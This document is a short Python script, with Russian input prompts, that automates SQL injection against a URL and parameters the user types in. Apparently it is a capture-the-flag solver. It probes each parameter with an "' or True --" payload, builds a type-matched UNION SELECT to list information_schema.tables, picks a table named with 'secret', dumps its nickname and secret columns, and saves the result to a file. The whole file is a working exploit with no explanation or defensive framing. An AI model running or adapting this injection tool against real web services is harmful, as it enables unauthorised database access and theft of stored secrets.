import requests
import json
import uuid


url = input("Введите URL: ")
params = input("Введите параметры: ").split()
injectible_params=[]
for param in params:
    response = json.loads(requests.get(f"{url}?{param}=' or True --").text)
    if response: injectible_params.append(param)


print(injectible_params)
param = injectible_params[0]
text = json.loads(requests.get(f"{url}?{param}=' or True --").text)

def check_value_type(value):
    try:
        uuid.UUID(value)
        return "UUID"
    except ValueError:
        try:
            int(value)
            return "Integer"
        except ValueError:
            return "String"


fields = {}
for field in text[0]:
    if check_value_type(text[0][field]) == "UUID":
        try: fields["UUID"] += ["'" + text[0][field] + "'"]
        except: fields["UUID"] = ["'" + text[0][field] + "'"]
    elif check_value_type(text[0][field]) == "Integer":
        try: fields["Integer"] += [1]
        except: fields["Integer"] = [1]
    elif check_value_type(text[0][field]) == "String":
        try: fields["String"] += ['table_name']
        except: fields["String"] = ['table_name']

listmerge5=lambda ll: [el for lst in ll for el in lst]

print()

tables = json.loads(requests.get(f"{url}?{param}=' or True union select " + ', '.join(listmerge5(list(fields.values()))) + " from information_schema.tables --").text)
for table in tables:
    for value in table.values():
        if "secret" in value:
            secret_table = value
            break

fields["String"][-1] = 'secret'
fields["String"][-2] = 'nickname'
for i in range(len(fields["String"])):
    if fields["String"][i] == 'table_name':
        fields["String"][i] = "'1'"

print(secret_table)
print(injectible_params)
answer = json.loads(requests.get(f"{url}?{param}=' or True union select " + ', '.join(listmerge5(list(fields.values()))) + f" from {secret_table} --").text)
print(answer)
with open('answer.txt', 'w+') as f:
    f.write(json.dumps(answer, indent=4))
